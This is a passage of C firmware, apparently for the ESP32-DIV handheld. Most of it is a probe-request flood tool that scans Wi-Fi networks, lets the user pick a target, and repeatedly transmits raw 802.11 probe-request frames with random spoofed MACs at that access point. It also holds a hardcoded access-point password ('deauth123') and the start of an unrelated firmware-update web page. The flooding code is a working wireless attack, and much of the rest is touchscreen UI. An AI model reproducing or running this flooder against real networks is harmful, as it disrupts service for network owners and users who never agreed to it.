  display_set_text_color_2(&(tft), isSel ? ORANGE : WHITE, TFT_BLACK);
  display_print(&(tft), (TEXT(isSel ? ">" : " ")).data);
  display_set_cursor(&(tft), 10, y);
  display_set_text_color_2(
      &(tft),
      isSel ? ORANGE
            : (ProbeRequestFlood_ap_list[i].authmode == WIFI_AUTH_OPEN ? ORANGE
                                                                       : WHITE),
      TFT_BLACK);
  display_print_line_cstr(&(tft), (TEXT(buf)).data);
}

static void ProbeRequestFlood_probeOpenTarget(int index) {
  if (index < 0 || index >= ProbeRequestFlood_network_count) {
    return;
  }
  ProbeRequestFlood_currentIndex = index;
  ProbeRequestFlood_selected_ap_index = index;
  ProbeRequestFlood_selectedAp = ProbeRequestFlood_ap_list[index];
  ProbeRequestFlood_selectedChannel = ProbeRequestFlood_ap_list[index].primary;
  ProbeRequestFlood_drawAttackScreen();
}

static bool ProbeRequestFlood_uiDrawn = false;

static uint8_t ProbeRequestFlood_ssidLength(const wifi_ap_record_t* ap) {
  uint8_t len = 0;
  while (len < sizeof(ap->ssid) && ap->ssid[len] != '\0') {
    len++;
  }
  return len;
}

static void ProbeRequestFlood_makeRandomMac(uint8_t* mac) {
  for (int i = 0; i < 6; i++) {
    mac[i] = (uint8_t)wifiRandU32(256);
  }
  mac[0] = (mac[0] & 0xFE) | 0x02;
}

static uint16_t ProbeRequestFlood_buildProbeFrame(const wifi_ap_record_t* ap,
                                                  uint8_t channel,
                                                  const uint8_t* srcMac) {
  uint16_t pos = 0;

  ProbeRequestFlood_probe_frame[pos++] = 0x40;
  ProbeRequestFlood_probe_frame[pos++] = 0x00;
  ProbeRequestFlood_probe_frame[pos++] = 0x00;
  ProbeRequestFlood_probe_frame[pos++] = 0x00;

  memset(&ProbeRequestFlood_probe_frame[pos], 0xFF, 6);
  pos += 6;
  memcpy(&ProbeRequestFlood_probe_frame[pos], srcMac, 6);
  pos += 6;
  memset(&ProbeRequestFlood_probe_frame[pos], 0xFF, 6);
  pos += 6;
  ProbeRequestFlood_probe_frame[pos++] = 0x00;
  ProbeRequestFlood_probe_frame[pos++] = 0x00;

  uint8_t ssid_len = ProbeRequestFlood_ssidLength(ap);
  ProbeRequestFlood_probe_frame[pos++] = 0x00;
  ProbeRequestFlood_probe_frame[pos++] = ssid_len;
  if (ssid_len > 0) {
    memcpy(&ProbeRequestFlood_probe_frame[pos], ap->ssid, ssid_len);
    pos += ssid_len;
  }

  ProbeRequestFlood_probe_frame[pos++] = 0x01;
  ProbeRequestFlood_probe_frame[pos++] = sizeof(ProbeRequestFlood_probe_rates);
  memcpy(&ProbeRequestFlood_probe_frame[pos], ProbeRequestFlood_probe_rates,
         sizeof(ProbeRequestFlood_probe_rates));
  pos += sizeof(ProbeRequestFlood_probe_rates);

  ProbeRequestFlood_probe_frame[pos++] = 0x03;
  ProbeRequestFlood_probe_frame[pos++] = 0x01;
  ProbeRequestFlood_probe_frame[pos++] = channel;

  return pos;
}

static void ProbeRequestFlood_sendProbeFrame(void) {
  uint8_t srcMac[6];
  ProbeRequestFlood_makeRandomMac(srcMac);

  esp_wifi_set_channel(ProbeRequestFlood_selectedChannel,
                       WIFI_SECOND_CHAN_NONE);
  uint16_t frame_len = ProbeRequestFlood_buildProbeFrame(
      &ProbeRequestFlood_selectedAp, ProbeRequestFlood_selectedChannel, srcMac);

  esp_err_t res = esp_wifi_80211_tx(WIFI_IF_AP, ProbeRequestFlood_probe_frame,
                                    frame_len, false);
  ProbeRequestFlood_packet_count++;
  if (res == ESP_OK) {
    ProbeRequestFlood_success_count++;
    ProbeRequestFlood_consecutive_failures = 0;
  } else {
    ProbeRequestFlood_consecutive_failures++;
  }
}

int ProbeRequestFlood_compare_ap(const void* a, const void* b) {
  wifi_ap_record_t* ap1 = (wifi_ap_record_t*)a;
  wifi_ap_record_t* ap2 = (wifi_ap_record_t*)b;
  return ap2->rssi - ap1->rssi;
}

void ProbeRequestFlood_drawButton(int x, int y, int w, int h, const char* label,
                                  bool highlight, bool disabled) {
  FeatureUI_ButtonStyle style = highlight ? FeatureUI_ButtonStyle_Primary
                                          : FeatureUI_ButtonStyle_Secondary;
  FeatureUI_drawButtonRect(x, y, w, h, label, style, false, disabled, 1);
}

void ProbeRequestFlood_drawTabBar(const char* leftButton, bool leftDisabled,
                                  const char* prevButton, bool prevDisabled,
                                  const char* nextButton, bool nextDisabled) {
  if (featureHasTouchNavBar()) {
    ProbeRequestFlood_probeUpdateNavLabels(
        ProbeRequestFlood_selected_ap_index >= 0);
    return;
  }

  display_fill_rect(&(tft), 0, 304, SCREEN_WIDTH, 16, FEATURE_BG);

  if (leftButton && leftButton[0]) {
    ProbeRequestFlood_drawButton(0, 304, 57, 16, leftButton, false,
                                 leftDisabled);
  }

  if (prevButton && prevButton[0]) {
    ProbeRequestFlood_drawButton(117, 304, 57, 16, prevButton, false,
                                 prevDisabled);
  }
  if (nextButton && nextButton[0]) {
    ProbeRequestFlood_drawButton(177, 304, 57, 16, nextButton, false,
                                 nextDisabled);
  }
}

void ProbeRequestFlood_drawScanScreen(void) {
  display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);
  wifiClearBody(TFT_BLACK);
  display_set_text_size(&(tft), 1);

  if (ProbeRequestFlood_scanning) {
    display_set_cursor(&(tft), 10, 50);
    display_set_text_color_1(&(tft), GREEN);
    display_print_line_cstr(&(tft), "Scanning.");
    loading(100, ORANGE, 0, 0, 3, true);
    display_set_cursor(&(tft), 10, 65);
    display_print_line_cstr(&(tft), "Wait a moment.");
    return;
  }

  if (ProbeRequestFlood_network_count == 0) {
    display_set_text_color_1(&(tft), GREEN);
    display_set_cursor(&(tft), 10, 50);
    display_print_line_cstr(&(tft), "No networks found.");
    display_set_cursor(&(tft), 10, 65);
    display_print_line_cstr(&(tft), "Press Rescan.");
  } else {
    const int perPage = ProbeRequestFlood_probeNetworksPerPage();
    if (ProbeRequestFlood_currentIndex < 0) {
      ProbeRequestFlood_currentIndex = 0;
    }
    if (ProbeRequestFlood_currentIndex >= ProbeRequestFlood_network_count) {
      ProbeRequestFlood_currentIndex =
          DIV_MAX(0, ProbeRequestFlood_network_count - 1);
    }
    ProbeRequestFlood_current_page =
        ProbeRequestFlood_currentIndex / DIV_MAX(1, perPage);

    display_set_text_color_1(&(tft), GREEN);
    display_set_cursor(&(tft), 10, ProbeRequestFlood_LIST_HEADER_Y);
    display_print_line_cstr(&(tft), "Networks:");

    char page_buf[32];
    snprintf(page_buf, sizeof(page_buf), "Page %lu/%lu",
             (unsigned long)(ProbeRequestFlood_current_page + 1),
             (unsigned long)DIV_MAX(
                 1, (ProbeRequestFlood_network_count + perPage - 1) / perPage));
    display_set_cursor(&(tft), 180, ProbeRequestFlood_LIST_HEADER_Y);
    display_set_text_color_1(&(tft), GREEN);
    display_print_line_cstr(&(tft), (TEXT(page_buf)).data);

    int y = ProbeRequestFlood_LIST_FIRST_ROW_Y;
    const int start_index = ProbeRequestFlood_current_page * perPage;
    const int end_index =
        DIV_MIN(start_index + perPage, ProbeRequestFlood_network_count);
    for (int i = start_index; i < end_index && y < wifiListBottomY(); i++) {
      ProbeRequestFlood_probeDrawApRow(i, y,
                                       i == ProbeRequestFlood_currentIndex);
      y += ProbeRequestFlood_LIST_ROW_H;
    }
  }

  ProbeRequestFlood_drawTabBar(
      "Rescan", false, "Prev", ProbeRequestFlood_currentIndex <= 0, "Next",
      ProbeRequestFlood_currentIndex >= ProbeRequestFlood_network_count - 1);
}

bool ProbeRequestFlood_scanNetworks(void) {
  ProbeRequestFlood_scanning = true;
  ProbeRequestFlood_current_page = 0;
  ProbeRequestFlood_currentIndex = 0;
  ProbeRequestFlood_drawScanScreen();

  ProbeRequestFlood_network_count = WifiScan_staWifiScanSync();
  if (ProbeRequestFlood_network_count <= 0) {
    ProbeRequestFlood_scanning = false;
    return false;
  }

  if (ProbeRequestFlood_ap_list) free(ProbeRequestFlood_ap_list);
  ProbeRequestFlood_ap_list = (wifi_ap_record_t*)malloc(
      ProbeRequestFlood_network_count * sizeof(wifi_ap_record_t));
  if (!ProbeRequestFlood_ap_list) {
    ProbeRequestFlood_scanning = false;
    return false;
  }

  for (int i = 0; i < ProbeRequestFlood_network_count; i++) {
    wifi_ap_record_t ap_record = {0};
    memcpy(ap_record.bssid, network_bssid(i), 6);
    strncpy((char*)ap_record.ssid, (network_ssid(i)).data,
            sizeof(ap_record.ssid));
    ap_record.rssi = network_rssi(i);
    ap_record.primary = network_channel(i);
    ap_record.authmode = network_auth_mode(i);
    ProbeRequestFlood_ap_list[i] = ap_record;
  }

  qsort(ProbeRequestFlood_ap_list, ProbeRequestFlood_network_count,
        sizeof(wifi_ap_record_t), ProbeRequestFlood_compare_ap);

  ProbeRequestFlood_scanning = false;
  return true;
}

bool ProbeRequestFlood_checkApChannel(const uint8_t* bssid, uint8_t* channel) {
  const int n = WifiScan_staWifiScanSync();
  for (int i = 0; i < n; i++) {
    if (memcmp(network_bssid(i), bssid, 6) == 0) {
      *channel = network_channel(i);
      network_set_mode(WIFI_MODE_AP);
      sys_sleep_ms(100);
      return true;
    }
  }

  network_set_mode(WIFI_MODE_AP);
  sys_sleep_ms(100);
  return false;
}

void ProbeRequestFlood_resetWifi(void) {
  esp_wifi_stop();
  sys_sleep_ms(200);
  esp_wifi_start();
  sys_sleep_ms(200);
  ProbeRequestFlood_packet_count = 0;
  ProbeRequestFlood_success_count = 0;
  ProbeRequestFlood_consecutive_failures = 0;
}

void ProbeRequestFlood_drawAttackScreen(void) {
  display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);
  wifiClearBody(TFT_BLACK);
  display_set_text_size(&(tft), 1);

  char buf[64];
  display_set_text_color_1(&(tft), WHITE);
  snprintf(buf, sizeof(buf), "Target: %s", ProbeRequestFlood_selectedAp.ssid);
  display_set_cursor(&(tft), 10, 50);
  display_print_line_cstr(&(tft), (TEXT(buf)).data);

  snprintf(buf, sizeof(buf), "BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
           ProbeRequestFlood_selectedAp.bssid[0],
           ProbeRequestFlood_selectedAp.bssid[1],
           ProbeRequestFlood_selectedAp.bssid[2],
           ProbeRequestFlood_selectedAp.bssid[3],
           ProbeRequestFlood_selectedAp.bssid[4],
           ProbeRequestFlood_selectedAp.bssid[5]);
  display_set_cursor(&(tft), 10, 70);
  display_print_line_cstr(&(tft), (TEXT(buf)).data);

  const char* auth;
  switch (ProbeRequestFlood_selectedAp.authmode) {
    case WIFI_AUTH_OPEN:
      auth = "OPEN";
      break;
    case WIFI_AUTH_WPA_PSK:
      auth = "WPA-PSK";
      break;
    case WIFI_AUTH_WPA2_PSK:
      auth = "WPA2-PSK";
      break;
    case WIFI_AUTH_WPA_WPA2_PSK:
      auth = "WPA/WPA2-PSK";
      break;
    default:
      auth = "Unknown";
      break;
  }
  snprintf(buf, sizeof(buf), "Auth: %s", auth);
  display_set_cursor(&(tft), 10, 85);
  display_print_line_cstr(&(tft), (TEXT(buf)).data);

  display_set_cursor(&(tft), 10, 100);
  display_set_text_color_1(
      &(tft), ProbeRequestFlood_attack_running ? ORANGE : UI_DIM_TEXT);
  display_print_line_cstr(
      &(tft), (TEXT(ProbeRequestFlood_attack_running ? "Status: Running"
                                                     : "Status: Stopped"))
                  .data);

  snprintf(buf, sizeof(buf), "Packets: %lu",
           (unsigned long)ProbeRequestFlood_packet_count);
  display_set_cursor(&(tft), 10, 115);
  display_set_text_color_1(&(tft), WHITE);
  display_print_line_cstr(&(tft), (TEXT(buf)).data);

  float success_rate = (ProbeRequestFlood_packet_count > 0)
                           ? (float)ProbeRequestFlood_success_count /
                                 ProbeRequestFlood_packet_count * 100
                           : 0;
  snprintf(buf, sizeof(buf), "Success: %.2f%%", success_rate);
  display_set_cursor(&(tft), 10, 130);
  display_print_line_cstr(&(tft), (TEXT(buf)).data);

  snprintf(buf, sizeof(buf), "Heap: %lu",
           (unsigned long)esp_get_free_heap_size());
  display_set_cursor(&(tft), 10, 145);
  display_print_line_cstr(&(tft), (TEXT(buf)).data);

  const char* buttons[] = {ProbeRequestFlood_attack_running ? "Stop" : "Start",
                           "Back"};
  ProbeRequestFlood_drawTabBar(buttons[0], false, "", true, buttons[1], false);
}

static void ProbeRequestFlood_probeHandleNavButtons(void) {
  const unsigned long now = sys_monotonic_ms();
  if (now - ProbeRequestFlood_probeLastButtonPress <
      ProbeRequestFlood_probeDebounceTime) {
    return;
  }

  if (ProbeRequestFlood_selected_ap_index >= 0) {
    if (isButtonPressed(BTN_LEFT)) {
      ProbeRequestFlood_attack_running = !ProbeRequestFlood_attack_running;
      if (!ProbeRequestFlood_attack_running) {
        ProbeRequestFlood_last_packet_time = 0;
      }
      ProbeRequestFlood_drawAttackScreen();
      ProbeRequestFlood_probeLastButtonPress = now;
      sys_sleep_ms(200);
      return;
    }
    if (isButtonPressed(BTN_RIGHT)) {
      ProbeRequestFlood_attack_running = false;
      ProbeRequestFlood_last_packet_time = 0;
      ProbeRequestFlood_selected_ap_index = -1;
      ProbeRequestFlood_drawScanScreen();
      ProbeRequestFlood_probeLastButtonPress = now;
      sys_sleep_ms(200);
      return;
    }
    return;
  }

  if (ProbeRequestFlood_scanning) {
    return;
  }

  if (isButtonPressed(BTN_LEFT)) {
    if (ProbeRequestFlood_scanNetworks()) {
      ProbeRequestFlood_drawScanScreen();
    }
    ProbeRequestFlood_probeLastButtonPress = now;
    sys_sleep_ms(200);
    return;
  }
  if (isButtonPressed(BTN_UP) && ProbeRequestFlood_currentIndex > 0) {
    ProbeRequestFlood_currentIndex--;
    ProbeRequestFlood_drawScanScreen();
    ProbeRequestFlood_probeLastButtonPress = now;
    sys_sleep_ms(200);
    return;
  }
  if (isButtonPressed(BTN_DOWN) &&
      ProbeRequestFlood_currentIndex < ProbeRequestFlood_network_count - 1) {
    ProbeRequestFlood_currentIndex++;
    ProbeRequestFlood_drawScanScreen();
    ProbeRequestFlood_probeLastButtonPress = now;
    sys_sleep_ms(200);
    return;
  }
  if (isButtonPressed(BTN_RIGHT) && ProbeRequestFlood_network_count > 0) {
    ProbeRequestFlood_probeOpenTarget(ProbeRequestFlood_currentIndex);
    ProbeRequestFlood_probeLastButtonPress = now;
    sys_sleep_ms(200);
  }
}

void ProbeRequestFlood_handleTouch(void) {
  int x, y;
  if (!readTouchXY(&(x), &(y))) return;

  bool redraw = false;
  if (ProbeRequestFlood_selected_ap_index == -1) {
    const int listMaxY = ProbeRequestFlood_LIST_FIRST_ROW_Y +
                         (ProbeRequestFlood_probeNetworksPerPage() *
                          ProbeRequestFlood_LIST_ROW_H);
    if (!ProbeRequestFlood_scanning &&
        y >= ProbeRequestFlood_LIST_FIRST_ROW_Y && y < listMaxY &&
        ProbeRequestFlood_network_count > 0) {
      int index = (y - ProbeRequestFlood_LIST_FIRST_ROW_Y) /
                      ProbeRequestFlood_LIST_ROW_H +
                  (ProbeRequestFlood_current_page *
                   ProbeRequestFlood_probeNetworksPerPage());
      if (index >= 0 && index < ProbeRequestFlood_network_count) {
        ProbeRequestFlood_probeOpenTarget(index);
        sys_sleep_ms(50);
      }
    } else if (!featureHasTouchNavBar() && !ProbeRequestFlood_scanning &&
               y >= 290 && y <= 320) {
      if (x >= 0 && x <= 57) {
        ProbeRequestFlood_drawButton(0, 304, 57, 16, "Rescan", true, false);
        sys_sleep_ms(50);
        if (ProbeRequestFlood_scanNetworks()) {
          ProbeRequestFlood_drawScanScreen();
        }
        redraw = true;
      } else if (x >= 122 && x <= 179 && ProbeRequestFlood_currentIndex > 0) {
        ProbeRequestFlood_drawButton(117, 304, 57, 16, "Prev", true, false);
        ProbeRequestFlood_currentIndex--;
        ProbeRequestFlood_drawScanScreen();
        sys_sleep_ms(50);
        redraw = true;
      } else if (x >= 183 && x <= 240 &&
                 ProbeRequestFlood_currentIndex <
                     ProbeRequestFlood_network_count - 1) {
        ProbeRequestFlood_drawButton(178, 304, 57, 16, "Next", true, false);
        ProbeRequestFlood_currentIndex++;
        ProbeRequestFlood_drawScanScreen();
        sys_sleep_ms(50);
        redraw = true;
      }
    }
  } else {
    if (!featureHasTouchNavBar() && y >= 290 && y <= 320) {
      if (x >= 0 && x <= 57) {
        ProbeRequestFlood_drawButton(
            0, 304, 57, 16, ProbeRequestFlood_attack_running ? "Stop" : "Start",
            true, false);
        ProbeRequestFlood_attack_running = !ProbeRequestFlood_attack_running;
        if (!ProbeRequestFlood_attack_running) {
          ProbeRequestFlood_last_packet_time = 0;
        }
        ProbeRequestFlood_drawAttackScreen();
        sys_sleep_ms(50);
        redraw = true;
      } else if (x >= 183 && x <= 240) {
        ProbeRequestFlood_drawButton(177, 304, 57, 16, "Back", true, false);
        ProbeRequestFlood_attack_running = false;
        ProbeRequestFlood_last_packet_time = 0;
        ProbeRequestFlood_selected_ap_index = -1;
        ProbeRequestFlood_drawScanScreen();
        sys_sleep_ms(50);
        redraw = true;
      }
    }
  }

  if (redraw) {
    sys_sleep_ms(100);
  }
}

void ProbeRequestFlood_runUI(void) {
#define SCREEN_WIDTH TFT_WIDTH
#define SCREENHEIGHT TFT_HEIGHT
#undef STATUS_BAR_Y_OFFSET
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#undef ICON_NUM
#define ICON_NUM 2

  static int iconX[ICON_NUM] = {220, 10};
  static int iconY = STATUS_BAR_Y_OFFSET;

  static const unsigned char* icons[ICON_NUM] = {bitmap_icon_undo,
                                                 bitmap_icon_go_back};

  if (!ProbeRequestFlood_uiDrawn) {
    display_fill_rect(&(tft), 0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH,
                      STATUS_BAR_HEIGHT, DARK_GRAY);
    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        display_draw_bitmap(&(tft), iconX[i], iconY, icons[i], ICON_SIZE,
                            ICON_SIZE, TFT_WHITE);
      }
    }
    display_draw_fast_h_line(&(tft), 0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT,
                             SCREEN_WIDTH, UI_LINE);
    ProbeRequestFlood_uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;
  static unsigned long lastSpamTime = 0;

  switch (animationState) {
    case 0:
      break;

    case 1:
      if (sys_monotonic_ms() - lastAnimationTime >= 150) {
        display_draw_bitmap(&(tft), iconX[activeIcon], iconY, icons[activeIcon],
                            ICON_SIZE, ICON_SIZE, TFT_WHITE);
        animationState = 2;
        lastAnimationTime = sys_monotonic_ms();
      }
      break;

    case 2:
      if (sys_monotonic_ms() - lastAnimationTime >= 200) {
        animationState = 3;
        lastAnimationTime = sys_monotonic_ms();
      }
      break;

    case 3:
      switch (activeIcon) {
        case 0:
          ProbeRequestFlood_scanNetworks();
          sys_sleep_ms(50);
          if (ProbeRequestFlood_scanNetworks()) {
            ProbeRequestFlood_drawScanScreen();
          }
          animationState = 0;
          activeIcon = -1;
          break;
      }
      break;
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;

  if (sys_monotonic_ms() - lastTouchCheck >= touchCheckInterval) {
    int x, y;
    if (feature_active && readTouchXY(&(x), &(y))) {
      if (y > STATUS_BAR_Y_OFFSET &&
          y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {
              if (i == 1) {
                feature_exit_requested = true;
              } else {
                display_draw_bitmap(&(tft), iconX[i], iconY, icons[i],
                                    ICON_SIZE, ICON_SIZE, TFT_BLACK);
                animationState = 1;
                activeIcon = i;
                lastAnimationTime = sys_monotonic_ms();
              }
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = sys_monotonic_ms();
  }
}

void ProbeRequestFlood_probeRequestFloodSetup(void) {
  pauseBackgroundRadioTasks();
  setTouchButtonInputEnabled(true);
  ProbeRequestFlood_probeUpdateNavLabels(false);
  featureClearContent(TFT_BLACK);

  setupTouchscreen();
  ProbeRequestFlood_uiDrawn = false;

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true, false);
  redrawTouchButtonBar();
  ProbeRequestFlood_runUI();

  display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);

  display_set_text_color_2(&(tft), GREEN, BLACK);
  display_set_text_size(&(tft), 1);
  display_set_cursor(&(tft), 10, 50);
  display_print_line_cstr(&(tft), "Initializing...");

  ProbeRequestFlood_attack_running = false;
  ProbeRequestFlood_selected_ap_index = -1;
  ProbeRequestFlood_current_page = 0;
  ProbeRequestFlood_currentIndex = 0;
  ProbeRequestFlood_scanning = false;

  if (!WifiScan_loadApListFromWifiCache(&ProbeRequestFlood_ap_list,
                                        &ProbeRequestFlood_network_count,
                                        ProbeRequestFlood_compare_ap)) {
    ProbeRequestFlood_scanNetworks();
  }

  ProbeRequestFlood_drawScanScreen();

  ProbeRequestFlood_drawScanScreen();
  redrawTouchButtonBar();
}

void ProbeRequestFlood_probeRequestFloodLoop(void) {
  if (feature_active &&
      (isButtonPressed(BTN_SELECT) || featureExitButtonPressed())) {
    feature_exit_requested = true;
    return;
  }

  display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);

  ProbeRequestFlood_probeHandleNavButtons();
  ProbeRequestFlood_handleTouch();
  updateStatusBar();
  ProbeRequestFlood_runUI();

  display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);

  uint32_t current_time = sys_monotonic_ms();
  if (ProbeRequestFlood_attack_running &&
      ProbeRequestFlood_selected_ap_index != -1) {
    uint32_t heap = esp_get_free_heap_size();
    if (heap < 80000) {
      ProbeRequestFlood_attack_running = false;
      ProbeRequestFlood_last_packet_time = 0;
      ProbeRequestFlood_drawAttackScreen();
      sys_sleep_ms(3000);
      return;
    }

    if (ProbeRequestFlood_consecutive_failures > 10) {
      ProbeRequestFlood_resetWifi();
      ProbeRequestFlood_last_packet_time = 0;
      sys_sleep_ms(3000);
      return;
    }

    if (current_time - ProbeRequestFlood_last_packet_time >= 60 &&
        ProbeRequestFlood_attack_running) {
      ProbeRequestFlood_sendProbeFrame();
      ProbeRequestFlood_last_packet_time = current_time;
    }
  }

  static uint32_t last_channel_check = 0;
  if (ProbeRequestFlood_attack_running &&
      current_time - last_channel_check > 15000) {
    uint8_t new_channel;
    if (ProbeRequestFlood_checkApChannel(ProbeRequestFlood_selectedAp.bssid,
                                         &new_channel)) {
      if (new_channel != ProbeRequestFlood_selectedChannel) {
        ProbeRequestFlood_selectedChannel = new_channel;
        wifi_config_t ap_config = {0};
        strncpy((char*)ap_config.ap.ssid, "ESP32-DIV",
                sizeof(ap_config.ap.ssid));
        ap_config.ap.ssid_len = strlen("ESP32-DIV");
        strncpy((char*)ap_config.ap.password, "deauth123",
                sizeof(ap_config.ap.password));
        ap_config.ap.authmode = WIFI_AUTH_WPA2_PSK;
        ap_config.ap.ssid_hidden = 0;
        ap_config.ap.max_connection = 4;
        ap_config.ap.beacon_interval = 100;
        ap_config.ap.channel = ProbeRequestFlood_selectedChannel;
        ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
      }
    }
    last_channel_check = current_time;
  }

  static uint32_t last_status_time = 0;
  if (ProbeRequestFlood_attack_running &&
      current_time - last_status_time > 2000) {
    ProbeRequestFlood_drawAttackScreen();
    last_status_time = current_time;
  }
}

#define FIRMWARE_FILE "/firmware.bin"

const char* FirmwareUpdate_host = "esp32";

#define SCREEN_WIDTH TFT_WIDTH
#undef SCREEN_HEIGHT
#define SCREEN_HEIGHT TFT_HEIGHT

#define BUTTON_WIDTH 230
#define BUTTON_HEIGHT 20
#define BUTTON1_X 5
#define BUTTON1_Y 50
#define BUTTON2_X 5
#define BUTTON2_Y 80

#define TAB_BUTTON_WIDTH 57
#define TAB_BUTTON_HEIGHT 16
#define TAB_LEFT_X 0
#define TAB_MIDDLE_X 117
#define TAB_RIGHT_X 177
#define TAB_Y 304

#define TS_MIN_X 300
#define TS_MAX_X 3800
#define TS_MIN_Y 300
#define TS_MAX_Y 3800

#define FW_NETWORKS_PER_PAGE 15
#define NETWORK_Y_START 70
#define NETWORK_ROW_HEIGHT 15

#define PASSWORD_MAX_LENGTH 32

static httpd_handle_t FirmwareUpdate_fw_httpd = NULL;

char FirmwareUpdate_selectedSSID[32] = "";
char FirmwareUpdate_wifiPassword[PASSWORD_MAX_LENGTH + 1] = "";

typedef struct {
  char ssid[32];
  int8_t rssi;
  uint8_t channel;
  uint8_t authmode;
} NetworkInfo;

void FirmwareUpdate_drawButton(int x, int y, int w, int h, const char* label,
                               bool highlight, bool disabled);
void FirmwareUpdate_drawTabBar(const char* leftButton, bool leftDisabled,
                               const char* prevButton, bool prevDisabled,
                               const char* nextButton, bool nextDisabled);
void FirmwareUpdate_drawMenu(void);
bool FirmwareUpdate_checkButton(int16_t x, int16_t y, int buttonX, int buttonY,
                                int buttonW, int buttonH);
static bool FirmwareUpdate_waitForTouchXY(int* x, int* y);
void FirmwareUpdate_performSDUpdate(void);
void FirmwareUpdate_drawNetworkList(int, int, NetworkInfo*, int);
bool FirmwareUpdate_selectWiFiNetwork(void);
bool FirmwareUpdate_enterWiFiPassword(void);
void FirmwareUpdate_performWebOTAUpdate(void);

const char* FirmwareUpdate_loginIndex =
    "<!doctype html><meta charset=\"utf-8\"><meta name=\"viewport\" "
    "content=\"width=device-width\">\n"
    "<title>ESP32-DIV firmware update</title><style>body{font:18px "
    "system-ui;max-width:36em;margin:8vh "
    "auto;padding:24px;background:#101820;color:#eee}input,button{font:inherit;"
    "margin:12px 0;display:block}progress{width:100%}</style>\n"
    "<h1>Firmware update</h1><p>Select the application .bin for this board. "
    "Enter the code shown on its screen.</p>\n"
    "<input id=\"code\" placeholder=\"Update code\" "
    "autocomplete=\"off\"><input id=\"file\" type=\"file\" "
    "accept=\".bin\"><button id=\"upload\">Install firmware</button><progress "
    "id=\"progress\" value=\"0\" max=\"100\"></progress><p id=\"status\"></p>\n"
    "<script>document.querySelector('#upload').onclick=()=>{const "
    "f=document.querySelector('#file').files[0];if(!f)return;const x=new "
    "XMLHttpRequest();x.open('POST','/"
    "update');x.setRequestHeader('Content-Type','application/"
    "octet-stream');x.setRequestHeader('X-Update-Token',document.querySelector("
    "'#code').value);x.upload.onprogress=e=>{if(e.lengthComputable)document."
    "querySelector('#progress').value=e.loaded/"
    "e.total*100};x.onload=()=>document.querySelector('#status').textContent=x."
    "responseText;x.onerror=()=>document.querySelector('#status').textContent='"
    "Connection failed';x.send(f)};</script>";

const char* FirmwareUpdate_serverIndex =
    "<!doctype html><meta charset=\"utf-8\"><meta name=\"viewport\" "
    "content=\"width=device-width\">\n"
    "<title>ESP32-DIV firmware update</title><style>body{font:18px "
    "system-ui;max-width:36em;margin:8vh "
    "auto;padding:24px;background:#101820;color:#eee}input,button{font:inherit;"
    "margin:12px 0;display:block}progress{width:100%}</style>\n"
    "<h1>Firmware update</h1><p>Select the application .bin for this board. "
    "Enter the code shown on its screen.</p>\n"
    "<input id=\"code\" placeholder=\"Update code\" "
    "autocomplete=\"off\"><input id=\"file\" type=\"file\" "
    "accept=\".bin\"><button id=\"upload\">Install firmware</button><progress "
    "id=\"progress\" value=\"0\" max=\"100\"></progress><p id=\"status\"></p>\n"
    "<script>document.querySelector('#upload').onclick=()=>{const "
    "f=document.querySelector('#file').files[0];if(!f)return;const x=new "
    "XMLHttpRequest();x.open('POST','/"
    "update');x.setRequestHeader('Content-Type','application/"
    "octet-stream');x.setRequestHeader('X-Update-Token',document.querySelector("
    "'#code').value);x.upload.onprogress=e=>{if(e.lengthComputable)document."
    "querySelector('#progress').value=e.loaded/"
    "e.total*100};x.onload=()=>document.querySelector('#status').textContent=x."
    "responseText;x.onerror=()=>document.querySelector('#status').textContent='"
    "Connection failed';x.send(f)};</script>";

static bool FirmwareUpdate_uiDrawn = false;
static FeatureUI_Button FirmwareUpdate_s_fwFooter[4];
static uint8_t FirmwareUpdate_s_fwFooterCount = 0;
static char FirmwareUpdate_s_fwNavCache[5][16] = {{0}};

static void FirmwareUpdate_fwResetNavCache(void) {
  for (int i = 0; i < 5; ++i) {
    FirmwareUpdate_s_fwNavCache[i][0] = '\0';
  }
}

static int FirmwareUpdate_fwContentBottom(void) {
  return featureHasTouchNavBar() ? (int)touchNavContentBottomY()
                                 : SCREEN_HEIGHT;
}

static void FirmwareUpdate_fwUpdateNavLabels(const char* left, const char* down,
                                             const char* center, const char* up,
                                             const char* right) {
  if (!featureHasTouchNavBar()) {
    return;
  }
  const char* src[5] = {left, down, center, up, right};
  bool same = true;
  for (int i = 0; i < 5; ++i) {
    const char* s = (src[i] && src[i][0]) ? src[i] : "";
    if (strcmp(FirmwareUpdate_s_fwNavCache[i], s) != 0) {
      same = false;
      break;
    }
  }
  if (same) {
    return;
  }
  for (int i = 0; i < 5; ++i) {
    const char* s = (src[i] && src[i][0]) ? src[i] : "";
    strncpy(FirmwareUpdate_s_fwNavCache[i], s,
            sizeof(FirmwareUpdate_s_fwNavCache[i]) - 1);
    FirmwareUpdate_s_fwNavCache[i][sizeof(FirmwareUpdate_s_fwNavCache[i]) - 1] =
        '\0';
  }
  setTouchNavLabels(left, down, center, up, right);
  redrawTouchButtonBar();
}

void FirmwareUpdate_runUI(void);

static void FirmwareUpdate_fwEnsureToolbar(void) {
  if (!FirmwareUpdate_uiDrawn) {
    FirmwareUpdate_runUI();
  }
  if (featureHasTouchNavBar()) {
    maintainTouchNavBar();
  }
}

static void FirmwareUpdate_fwRestoreNavChrome(void) {
  if (!featureHasTouchNavBar()) {
    return;
  }
  invalidateTouchButtonCue();
